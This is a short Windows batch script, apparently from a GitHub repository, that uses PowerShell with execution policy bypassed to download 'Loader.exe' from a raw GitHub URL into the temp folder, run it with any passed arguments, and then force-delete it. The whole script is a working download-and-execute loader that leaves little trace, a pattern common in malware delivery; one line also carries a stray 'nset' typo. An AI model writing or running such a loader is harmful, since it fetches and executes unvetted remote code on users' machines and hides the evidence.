@echo off
REM run.bat - download Loader.exe from this repository, run it with any passed arguments, then delete it.
nset "URL=https://raw.githubusercontent.com/daophet11mm55-bit/arthur/main/Loader.exe"

powershell -NoProfile -ExecutionPolicy Bypass -Command "$f=[IO.Path]::Combine($env:TEMP,'Loader.exe'); Invoke-WebRequest '%URL%' -OutFile $f; Start-Process -FilePath $f -ArgumentList %* -Wait; Remove-Item $f -Force"
